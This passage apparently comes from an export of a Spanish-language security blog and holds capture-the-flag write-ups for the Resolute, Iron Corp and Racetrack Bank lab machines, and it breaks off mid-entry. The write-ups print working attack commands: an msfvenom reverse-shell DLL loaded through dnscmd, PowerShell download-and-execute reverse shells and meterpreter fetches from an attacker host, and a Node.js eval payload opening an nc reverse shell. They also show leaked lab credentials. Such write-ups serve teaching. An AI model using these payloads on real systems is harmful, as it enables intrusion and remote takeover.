0x00000215 Account: Guest\tName: (null)\tDesc: Built-in account for guest access to the computer/domain index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo\tName: (null)\tDesc: (null) index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt\tName: (null)\tDesc: Key Distribution Center Service Account index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus\tName: (null)\tDesc: (null) index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko\tName: Marko Novak\tDesc: Account created. Password set to Welcome123! index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie\tName: (null)\tDesc: (null) index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki\tName: (null)\tDesc: (null) index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo\tName: (null)\tDesc: (null) index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per\tName: (null)\tDesc: (null) index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan\tName: Ryan Bertrand\tDesc: (null) index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally\tName: (null)\tDesc: (null) index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon\tName: (null)\tDesc: (null) index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve\tName: (null)\tDesc: (null) index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie\tName: (null)\tDesc: (null) index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita\tName: (null)\tDesc: (null) index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf\tName: (null)\tDesc: (null) index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach\tName: (null)\tDesc: (null) user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[DefaultAccount] rid:[0x1f7] user:[ryan] rid:[0x451] user:[marko] rid:[0x457] user:[sunita] rid:[0x19c9] user:[abigail] rid:[0x19ca] user:[marcus] rid:[0x19cb] user:[sally] rid:[0x19cc] user:[fred] rid:[0x19cd] user:[angela] rid:[0x19ce] user:[felicia] rid:[0x19cf] user:[gustavo] rid:[0x19d0] user:[ulf] rid:[0x19d1] user:[stevie] rid:[0x19d2] user:[claire] rid:[0x19d3] user:[paulo] rid:[0x19d4] user:[steve] rid:[0x19d5] user:[annette] rid:[0x19d6] user:[annika] rid:[0x19d7] user:[per] rid:[0x19d8] user:[claude] rid:[0x19d9] user:[melanie] rid:[0x2775] user:[zach] rid:[0x2776] user:[simon] rid:[0x2777] user:[naoki] rid:[0x2778] ========================================= | Share Enumeration on 10.10.10.169 | ========================================= Sharename Type Comment --------- ---- ------- SMB1 disabled -- no workgroup available [+] Attempting to map shares on 10.10.10.169 ==================================================== | Password Policy Information for 10.10.10.169 | ==================================================== [+] Attaching to 10.10.10.169 using a NULL share [+] Trying protocol 445/SMB... [+] Found domain(s): [+] MEGABANK [+] Builtin [+] Password Info for Domain: MEGABANK [+] Minimum password length: 7 [+] Password history length: 24 [+] Maximum password age: Not Set [+] Password Complexity Flags: 000000 [+] Domain Refuse Password Change: 0 [+] Domain Password Store Cleartext: 0 [+] Domain Password Lockout Admins: 0 [+] Domain Password No Clear Change: 0 [+] Domain Password No Anon Change: 0 [+] Domain Password Complex: 0 [+] Minimum password age: 1 day 4 minutes [+] Reset Account Lockout Counter: 30 minutes [+] Locked Account Duration: 30 minutes [+] Account Lockout Threshold: None [+] Forced Log off Time: Not Set [+] Retieved partial password policy with rpcclient: ============================== | Groups on 10.10.10.169 | ============================== [+] Getting builtin groups: group:[Account Operators] rid:[0x224] group:[Pre-Windows 2000 Compatible Access] rid:[0x22a] group:[Incoming Forest Trust Builders] rid:[0x22d] group:[Windows Authorization Access Group] rid:[0x230] group:[Terminal Server License Servers] rid:[0x231] group:[Administrators] rid:[0x220] group:[Users] rid:[0x221] group:[Guests] rid:[0x222] group:[Print Operators] rid:[0x226] group:[Backup Operators] rid:[0x227] group:[Replicator] rid:[0x228] group:[Remote Desktop Users] rid:[0x22b] group:[Network Configuration Operators] rid:[0x22c] group:[Performance Monitor Users] rid:[0x22e] group:[Performance Log Users] rid:[0x22f] group:[Distributed COM Users] rid:[0x232] group:[IIS_IUSRS] rid:[0x238] group:[Cryptographic Operators] rid:[0x239] group:[Event Log Readers] rid:[0x23d] group:[Certificate Service DCOM Access] rid:[0x23e] group:[RDS Remote Access Servers] rid:[0x23f] group:[RDS Endpoint Servers] rid:[0x240] group:[RDS Management Servers] rid:[0x241] group:[Hyper-V Administrators] rid:[0x242] group:[Access Control Assistance Operators] rid:[0x243] group:[Remote Management Users] rid:[0x244] group:[System Managed Accounts Group] rid:[0x245] group:[Storage Replica Administrators] rid:[0x246] group:[Server Operators] rid:[0x225] [+] Getting builtin group memberships: Group \u0026#39;IIS_IUSRS\u0026#39; (RID: 568) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;System Managed Accounts Group\u0026#39; (RID: 581) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Windows Authorization Access Group\u0026#39; (RID: 560) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Pre-Windows 2000 Compatible Access\u0026#39; (RID: 554) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Remote Management Users\u0026#39; (RID: 580) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Guests\u0026#39; (RID: 546) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Event Log Readers\u0026#39; (RID: 573) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE Group \u0026#39;Users\u0026#39; (RID: 545) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE Group \u0026#39;Administrators\u0026#39; (RID: 544) has member: Couldn\u0026#39;t lookup SIDs [+] Getting local groups: group:[Cert Publishers] rid:[0x205] group:[RAS and IAS Servers] rid:[0x229] group:[Allowed RODC Password Replication Group] rid:[0x23b] group:[Denied RODC Password Replication Group] rid:[0x23c] group:[DnsAdmins] rid:[0x44d] [+] Getting local group memberships: Group \u0026#39;DnsAdmins\u0026#39; (RID: 1101) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Denied RODC Password Replication Group\u0026#39; (RID: 572) has member: Couldn\u0026#39;t lookup SIDs [+] Getting domain groups: group:[Enterprise Read-only Domain Controllers] rid:[0x1f2] group:[Domain Admins] rid:[0x200] group:[Domain Users] rid:[0x201] group:[Domain Guests] rid:[0x202] group:[Domain Computers] rid:[0x203] group:[Domain Controllers] rid:[0x204] group:[Schema Admins] rid:[0x206] group:[Enterprise Admins] rid:[0x207] group:[Group Policy Creator Owners] rid:[0x208] group:[Read-only Domain Controllers] rid:[0x209] group:[Cloneable Domain Controllers] rid:[0x20a] group:[Protected Users] rid:[0x20d] group:[Key Admins] rid:[0x20e] group:[Enterprise Key Admins] rid:[0x20f] group:[DnsUpdateProxy] rid:[0x44e] group:[Contractors] rid:[0x44f] [+] Getting domain group memberships: Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\Administrator Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\DefaultAccount Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\krbtgt Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\ryan Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\marko Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\sunita Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\abigail Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\marcus Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\sally Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\fred Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\angela Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\felicia Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\gustavo Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\ulf Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\stevie Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\claire Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\paulo Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\steve Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\annette Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\annika Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\per Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\claude Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\melanie Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\zach Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\simon Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\naoki Group \u0026#39;Contractors\u0026#39; (RID: 1103) has member: MEGABANK\\ryan Group \u0026#39;Enterprise Admins\u0026#39; (RID: 519) has member: MEGABANK\\Administrator Group \u0026#39;Group Policy Creator Owners\u0026#39; (RID: 520) has member: MEGABANK\\Administrator Group \u0026#39;Domain Controllers\u0026#39; (RID: 516) has member: MEGABANK\\RESOLUTE$ Group \u0026#39;Schema Admins\u0026#39; (RID: 518) has member: MEGABANK\\Administrator Group \u0026#39;Domain Computers\u0026#39; (RID: 515) has member: MEGABANK\\MS02$ Group \u0026#39;Domain Guests\u0026#39; (RID: 514) has member: MEGABANK\\Guest Group \u0026#39;Domain Admins\u0026#39; (RID: 512) has member: MEGABANK\\Administrator ======================================================================= | Users on 10.10.10.169 via RID cycling (RIDS: 500-550,1000-1050) | ======================================================================= [E] Couldn\u0026#39;t get SID: NT_STATUS_ACCESS_DENIED. RID cycling not possible. ============================================= | Getting printer info for 10.10.10.169 | ============================================= Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED enum4linux complete on Mon Jan 6 16:32:54 2020 Enum4linux nos muestra la lista de grupos, usuarios, dominio, entre mucha otra informacion de interes, pero especificamente en la parte de usuarios nos muestra un comentario del usuario marko, el cual contiene un comentario en la descripcion y nos indica que la contraseña que le fue impuesta a este usuario es Welcome123!.\n1 index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko\tName: Marko Novak\tDesc: Account created. Password set to Welcome123! Al intentar iniciar sesion o enumerar los SHARENAMES con smbmap y smbclient junto con las credenciales, no fue posible, utilizamos evil-winrm, ya que el puerto 5985 de winrm esta abierto en la maquina para intentar ingresar en ese puerto, pero nos muestra un mensaje de error de Autenticacion.\nUser - Melanie Sin descartar la contraseña que encontramos utilizamos un pequeño diccionario con los usuarios disponibles en la maquina y, junto a un pequeño script de bash y evil-winrm, intentar con cada usuario la contraseña Welcome123!. Al hacer esto logramos que la usuario Melanie iniciara sesion satisfactoriamente en winrm, obteniendo asi una shell y nuestra flag user.txt.\nUser - Ryan Al ingresar a la maquina hicimos una enumeracion de archivos, en el dsco C:/ encontramos un archivo que contiene un log de ejecucion de comandos, entre los comandos vemos que se utilizó net use junto con un usuario y una contraseña que pertenecen a ryan.\nCredenciales:\nryan:Serv3r4Admin4cc123! PRIVILEGE ESCALATION - Abusing DNSAdmins Utilizamos evil-winrm nuevamente para obtener una shell con el usuario ryan, enumeramos los grupos en los que el usuario se encuentra (Domain Users, Contractors).\nwhoami /groups nos da mejor informacion sobre este usuario, vemos que ryan pertenece a varios grupos, uno de ellos es MEGABANK\\DnsAdmins.\nYa que ryan pertenece a DnsAdmins vamos a explotar sus privilegios para poder cargar un fichero DLL con privilegios de administrador en el Servidor de DNS que la maquina tiene corriendo.\nAbusing DNSAdmins\nPrimero vamos a crear un archivo DLL con msfvenom para ejecutar una shell inversa hacia nuestra maquina.\n1 msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=1339 --platform=windows -f dll \u0026gt; revshell.dll Creamos un servidor de SAMBA utilizando las herramientas de impacket y ponemos a la escucha netcat en nuestra maquina o de igual forma con metasploit.\n1 python smbserver.py DLL . Ya que el servidor DNS esta corriendo sobre el Domain Controller (DC) podemos utilizar simplemente dnscmd para poder cargar el DLL.\n1 dnscmd /config /serverlevelplugindll \\\\10.10.15.105\\DLL\\revshell.dll Luego de ello vamos a parar e iniciar el servidor DNS nuevamente.\nsc.exe stop dns; sc.exe start dns Obtenemos una respuesta en nuestro servidor SMB y nuestra shell con privilegios de Administrador.\nSMB:\nObtenemos una sesion en Metasploit:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 msf5 exploit(multi/handler) \u0026gt; show options Module options (exploit/multi/handler): Name Current Setting Required Description ---- --------------- -------- ----------- Payload options (windows/x64/shell_reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: \u0026#39;\u0026#39;, seh, thread, process, none) LHOST 10.10.15.105 yes The listen address (an interface may be specified) LPORT 1339 yes The listen port Exploit target: Id Name -- ---- 0 Wildcard Target msf5 exploit(multi/handler) \u0026gt; exploit [*] Started reverse TCP handler on 10.10.15.105:1339 [*] Command shell session 1 opened (10.10.15.105:1339 -\u0026gt; 10.10.10.169:52284) at 2020-01-07 19:05:30 -0600 C:\\Windows\\system32\u0026gt;whoami whoami nt authority\\system C:\\Windows\\system32\u0026gt; Cambiamos a una shell de windows y leemos nuestra flag root.txt.\n","description":"Resolute con SO Windows expone Samba y Ldap, lo que nos dio informacion para ingresar por WinRM. Encontramos credenciales en un archivo para tener acceso a un segundo usuario. Encontramos que el usuario petenece al grupo DnsAdmins, configuramos dnscmd con un payload de metasploit para conseguir una shell como administrador.","id":136,"section":"posts","tags":["enum4linux","evil-winrm","metasploit","impacket"],"title":"Hack The Box - Resolute","uri":"https://sckull.github.io/posts/resolute/"},{"content":"\rIron Corp es una maquina de TryHackMe, enumeramos subdominios con dig, con Hydra realizamos ataque de contraseñas a uno de los subdominios donde encontramos una vulnerabilidad LFI y donde realizamos Command Injection para obtener acceso por medio de una shell en PowerShell. Escalamos privilegios utilizando Metasploit con Incognito y un token que encontramos.\nRoom Titulo Iron Corp Descripción Can you get access to Iron Corp\u0026rsquo;s system? Puntos 160 Dificultad Dificil Maker MrSeth6797 NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (8080), rdp (3889) y el puerto dns (53) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 # Nmap 7.80 scan initiated Sat May 9 00:53:02 2020 as: nmap -Pn -T5 -p1-65535 -o scan_allports ironcorp.me Nmap scan report for ironcorp.me (10.10.84.168) Host is up (0.33s latency). Not shown: 65528 filtered ports PORT STATE SERVICE 53/tcp open domain 135/tcp open msrpc 3389/tcp open ms-wbt-server 8080/tcp open http-proxy 11025/tcp open unknown 49667/tcp open unknown 49670/tcp open unknown # Nmap done at Sat May 9 01:00:44 2020 -- 1 IP address (1 host up) scanned in 462.74 seconds # Nmap 7.80 scan initiated Sat May 9 01:12:08 2020 as: nmap -Pn -sV -sC -p53,135,3389,8080,11025,49667,49670 -o scan_allports_big ironcorp.me Nmap scan report for ironcorp.me (10.10.84.168) Host is up (0.17s latency). PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 135/tcp open msrpc Microsoft Windows RPC 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: WIN-8VMBKF3G815 | NetBIOS_Domain_Name: WIN-8VMBKF3G815 | NetBIOS_Computer_Name: WIN-8VMBKF3G815 | DNS_Domain_Name: WIN-8VMBKF3G815 | DNS_Computer_Name: WIN-8VMBKF3G815 | Product_Version: 10.0.14393 |_ System_Time: 2020-05-09T06:14:42+00:00 | ssl-cert: Subject: commonName=WIN-8VMBKF3G815 | Not valid before: 2020-04-12T18:27:11 |_Not valid after: 2020-10-12T18:27:11 |_ssl-date: 2020-05-09T06:14:55+00:00; 0s from scanner time. 8080/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Dashtreme Admin - Free Dashboard for Bootstrap 4 by Codervent 11025/tcp open http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.4.4) | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.4.4 |_http-title: Coming Soon - Start Bootstrap Theme 49667/tcp open msrpc Microsoft Windows RPC 49670/tcp open msrpc Microsoft Windows RPC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=5/9%Time=5EB649C4%P=x86_64-pc-linux-gnu%r(DNSVe SF:rsionBindReqTCP,20,\u0026#34;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\x SF:04bind\\0\\0\\x10\\0\\x03\u0026#34;); Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat May 9 01:14:55 2020 -- 1 IP address (1 host up) scanned in 167.13 seconds HTTP 8080 En el puerto 8080 encontramos una pagina en la que vemos un dashboard.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 root@upset:~/thm/ironcorp# gobuster dir -u http://ironcorp.me:8080/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /assets (Status: 301) /calendar.html (Status: 200) /forms.html (Status: 200) /icons.html (Status: 200) /index.html (Status: 200) /index.html (Status: 200) /Index.html (Status: 200) /login.html (Status: 200) /Login.html (Status: 200) /profile.html (Status: 200) /register.html (Status: 200) root@upset:~/thm/ironcorp# DIG - DNS Enumeration Utilizamos DIG para obtener informacion de los DNS.\nHacemos una transferencia de zona y encontramos dos nuevos subdominios.\nNuevamente ejecutamos Gobuster en los nuevos dos subdominios y encontramos las mismas direcciones que en el dominio principal.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 root@upset:~/thm/ironcorp# gobuster dir -u http://internal.ironcorp.me:8080/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /assets (Status: 301) /calendar.html (Status: 200) /forms.html (Status: 200) /icons.html (Status: 200) /index.html (Status: 200) /Index.html (Status: 200) /index.html (Status: 200) /login.html (Status: 200) /Login.html (Status: 200) /profile.html (Status: 200) /register.html (Status: 200) root@upset:~/thm/ironcorp# gobuster dir -u http://admin.ironcorp.me:8080/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /assets (Status: 301) /calendar.html (Status: 200) /forms.html (Status: 200) /icons.html (Status: 200) /index.html (Status: 200) /Index.html (Status: 200) /index.html (Status: 200) /login.html (Status: 200) /Login.html (Status: 200) /profile.html (Status: 200) /register.html (Status: 200) root@upset:~/thm/ironcorp# En los tres subdominios encontramos la misma pagina estatica.\nHTTP 11025 En el puerto 11025 encontramos una pagina en la que vemos un formulario de email.\nEn el subdominio internal.ironcorp.me al parecer no tiene nada\nEn el subdominio admin.ironcorp.me una autenticacion basica\nNuevamente ejecutamos Gobuster en el dominio principal pero no encontramos nada interesante.\n1 2 3 4 5 6 7 8 9 10 11 root@upset:~/thm/ironcorp# gobuster dir -u http://ironcorp.me:11025/ -w /usr/share/wordlists/dirb/common.txt -q -t 50 -x php,html,txt,aspx,asp -s 200,301 /css (Status: 301) /img (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /Index.html (Status: 200) /js (Status: 301) /license (Status: 200) /LICENSE (Status: 200) /vendor (Status: 301) root@upset:~/thm/ironcorp# HYDRA Utilizamos hydra para realizar un ataque de fuerza bruta en el subdominio admin.ironcorp.me, logramos encontrar las credenciales.\nLFI/Command Injection - Admin Area En el subdominio en el que encontramos las credenciales al iniciar sesion nos muestra una pagina en la que contiene un input para realizar querys.\nAl realizar alguna busqueda o query no nos devuelve ningun resultado, intentamos realizar un RFI mediante una shell php, asp, apsx, pero ninguna de estas funcionó, solamente nos trae el codigo fuente y lo muestra en la pagina más no lo ejecuta.\nIntentamos leer archivos de sistema como index.php pero no logra obtener el archivo incluso utilizando localhost:11025/index.php, pero para poder obtener el codigo de esta pagina podemos utilizar el propio dominio y/o subdominio que tiene la maquina en su archivo c:\\Windows\\System32\\Drivers\\etc\\hosts para que la propia maquina reconozca su subdominio y obtenga el codigo fuente.\nAl hacer esto encontramos un subdominio que si funcionó y nos trajo el codigo fuente del index.php, donde nos muestra un mensaje.\nAl dirigirnos a la direccion que nos muestra, al parecer no tenemos permisos para ver el archivo.\nLe pasamos el dominio con la pagina para obtener su codigo fuente como la pagina de index.php anterior y logramos ver que el codigo se ejecuta y se muestra en la pagina, pero no nos muestra el codigo fuente.\nLe pasamos un nombre como parametro y se muestra en la pagina.\nIntentamos ejecutar codigos en la maquina con Command Injection utilizando shell scape. Logramos obtener la ejecucion de whoami y vemos que el usuario tiene permisos de super usuario (nt authority\\system).\nSHELL - Administrator Utilizamos una de las shells que tiene nishang Invoke-PowerShellTcp.ps1, en nuestro archivo Invoke-PowerShellTcp.ps1 agregamos la siguiente linea al final del archivo para ejecutar nuestra shell inversa cuando este sea descargado, con la IP y el puerto al que se va a conectar.\n1 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 1338 El comando que vamos a ejecutar en la maquina es el siguiente, para ejecutar nuestra shell\n1 powershell.exe -c iex(new-object net.webclient).downloadstring(\u0026#39;http://10.10.10.10/Invoke-PowerShellTcp.ps1\u0026#39;) Por alguna razon no acepta los espacios y hay que codificar nuestro comando dos veces para que se ejecute\nEjecutamos y logramos obtener nuestra shell\nY nuestra primera flag user.txt\nPRIVILEGE ESCALATION Utilizamos metasploit para conseguir una shell meterpreter utilizando un payload en powershell.\nmetasploit\nmsfconsole -x \u0026#34;use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost tun0; set lport 1337; set ExitOnSession false; exploit -j\u0026#34; shell\npowershell -command \u0026#34;\u0026amp; { iwr 10.10.10.10/meterpreter-64.ps1 -OutFile C:\\Users\\Administrator\\Desktop\\meterpreter-64.ps1 }\u0026#34;\rImport-Module .\\meterpreter-64.ps1 Logramos obtener una sesion en meterpreter y los hashes de los usuarios :)\nPero lastimosamente no podemos utilizar estas credenciales ya que no existe algun servicio en donde podamos utilizarlas, es por eso que utilizamos incognito para poder obtener los tokens del usuario Admin, utilizarlas y obtener nuestra flag root.txt y una shell con ese usuario.\nListamos las tokens y las utilizamos.\n","description":"Iron Corp es una maquina de TryHackMe, enumeramos subdominios con dig, con Hydra realizamos ataque de contraseñas a uno de los subdominios donde encontramos una vulnerabilidad LFI y donde realizamos Command Injection para obtener acceso por medio de una shell en PowerShell. Escalamos privilegios utilizando Metasploit con Incognito y un token que encontramos.","id":137,"section":"posts","tags":["dig","lfi","nishang","metasploit"],"title":"TryHackMe - Iron Corp","uri":"https://sckull.github.io/posts/ironcorp/"},{"content":"\rRacetrack Bank es una maquina de TryHackMe involucra transferencia asincrona para ganar privilegios en una aplicacion web lo que nos dio acceso a la maquina tras ejecutar una shell inversa. Escalamos privilegios modificando un script utilizado por un CronJob.\nRoom Titulo Racetrack Bank Descripción It\u0026rsquo;s time for another heist. Puntos 110 Dificultad Dificil Maker deltatemporal NMAP 1 2 3 4 5 6 7 8 9 10 11 12 Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos. # Nmap 7.80 scan initiated Tue May 12 17:18:37 2020 as: nmap -sV -o nmap_scan_mini racetrackbank.thm Nmap scan report for racetrackbank.thm (10.10.163.203) Host is up (0.36s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx 1.14.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue May 12 17:20:04 2020 -- 1 IP address (1 host up) scanned in 86.52 seconds HTTP En el puerto 80 encontramos una pagina en la que vemos una pagina sencilla\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 root@upset:~/thm/racetrackbank# gobuster dir -u http://racetrackbank.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /create.html (Status: 200) /home.html (Status: 302) /Home.html (Status: 302) /images (Status: 301) /Images (Status: 301) /Index.html (Status: 200) /index.html (Status: 200) /index.html (Status: 200) /login.html (Status: 200) /Login.html (Status: 200) /purchase.html (Status: 302) Creamos una cuenta en la pagina y al iniciar sesion nos encontramos con un mensaje en el que indica que nos han dado 1 Gold y en la parte superior derecha vemos la cantidad.\nTambien vemos la pagina de Purchase y Give Gold, en la primera podemos comprar una cuenta premium, en la segunda podemos regalar a un usuario Golds segun la cantidad que querramos.\nAl analizar el codigo fuente de estas paginas, encontramos que existe una tercera pagina premiumfeatures.html en la cual no tenemos acceso.\nAnalizamos las peticiones con Burpsuite y vemos que en el header de la respuesta Express por lo que podemos deducir que la pagina esta corriendo en NodeJS.\nTransferencia Asincrona GOLD - WFUZZ Creamos una segunda cuenta, para poder regalar Gold a esta desde la primera cuenta. Le damos 1 Gold a pika desde test, y al hacer esto, test se queda en 0 y pika tiene 2, entonces, dependiendo de cuantas Gold tengamos, esa cantidad podemos regalar, hay que mencionar que se tarda en realizar la transaccion.\nHasta este punto, no habia otra parte en donde podriamos realizar alguna explotacion, por lo que podríamos crear 10 mil cuentas y utilizar esas cuentas para dar a una sola los 10,000 Gold para comprar una cuenta premium y ver lo que hay ahí pero no seria lo mejor.\nRegresamos y revisamos el nombre de la maquina para ver si tenemos una alguna pista como en la maquina Mango - HackTheBox que en su nombre nos indicaba la base de datos Mongo, en el caso de esta maquina nos menciona Racetrack que al investigar acerca de este nombre podría hacer referencia al paquete racetrack - npm que se encarga de verificar las peticiones asincronas.\nHaciendo referencia a la funcionalidad Asíncrona del paquete, utilizamos wfuzz para realizar multiples peticiones en las que realizamos una transferencia de Gold de una cuenta a otra. Utilizamos un diccionario en el cual tenemos mil lineas con el numero 1 para poder utilizar en el parametro FUZZ necesario en wfuzz. Pero primero capturamos la peticion de transferencia y eliminamos los elementos del header que no son necesarios, la sintaxis quedaría de la siguiente forma:\nTransaccion de pika a test\nwfuzz -u http://racetrackbank.thm/api/givegold -H \u0026#34;Content-Type: application/x-www-form-urlencoded\u0026#34; -b \u0026#34;connect.sid=s%3A1WZ2nxR7AU8055fkeBW_cLlTaLFVV6Sk.zoPUEOLRtqGfnyd291VT%2BJuzMlkFKT6NAxVjuSExNsY\u0026#34; -d \u0026#34;user=test\u0026amp;amount=FUZZ\u0026#34; Al ejecutar esto obtenemos multiples respuestas 302, en donde las primeras diez tienen menos caracteres (agregamos --sh 54 a wfuzz) que las siguientes.\nRevisamos la cuenta de test y vemos que tenemos más Gold, por lo que es muy probable que tenga la funcionalidad asincrona.\nAhora realizamos una transaccion de test a pika y volvemos a hacer lo mismo con wfuzz (aumentamos 5 en 5 nuestro diccionario) asi hasta lograr los Gold necesarios para una cuenta premium en la cuenta test. Por alguna razon al realizar esta \u0026ldquo;explotacion\u0026rdquo; en ambas cuentas aumentan los Gold.\nBRIAN USER - RCE NodeJS Hacemos la compra de una cuenta Premium, y podemos acceder a la pagina Premium Features donde encontramos un input que al ingresar una operacion matematica nos devuelve el resultado.\nNODEJS RCE\nUtilizamos el payload process.cwd() para verificar el PATH donde esta la pagina ejecutandose, nos devuelve la carpeta principal de uno de los usuarios, el payload funciona y podemos intentar obtener una shell utilizando require().\nPonemos a la escucha nuestro netcat (rlwrap nc -lvp 1338) y ejecutamos nuestro payload en la pagina require(\u0026quot;child_process\u0026quot;).exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.10.10 1338 \u0026gt;/tmp/f') utilizando burpsuite, codificamos nuestro payload.\nLogramos obtener una shell y nuestra flag user.txt.\nVemos el codigo fuente de la pagina PremiumFeatures donde eval esta presente.\nTambien encontramos las credenciales de la base de datos\nPRIVILEGE ESCALATION Dentro de la maquina encontramos un binario el cual tiene permisos root, pero al anlizarlo y ejecutarlo no se pudo hacer mayor cosa.\nUtilizamos pspy para ver los cron job, y encontramos uno que ejecuta cleanupscript.sh que se encuentra en /home/brian/cleanup/.\nCambiamos de nombre al archivo, creamos uno nuevo con el mismo nombre y agregamos un comando para obtener la flag root.txt, esperamos y obtuvimos el contenido.\nAgregamos una shell inversa al archivo y obtenemos una shell con usuario root.\n","description":"Racetrack Bank es una maquina de TryHackMe involucra transferencia asincrona para ganar privilegios en una aplicacion web lo que nos dio acceso a la maquina tras ejecutar una shell inversa. Escalamos privilegios modificando un script utilizado por un CronJob.","id":138,"section":"posts","tags":["nodejs","suid","cron"],"title":"TryHackMe - Racetrack Bank","uri":"https://sckull.github.io/posts/racetrackbank/"},{"content":"\rObscurity tiene expuesto el codigo fuente de la aplicacion web, 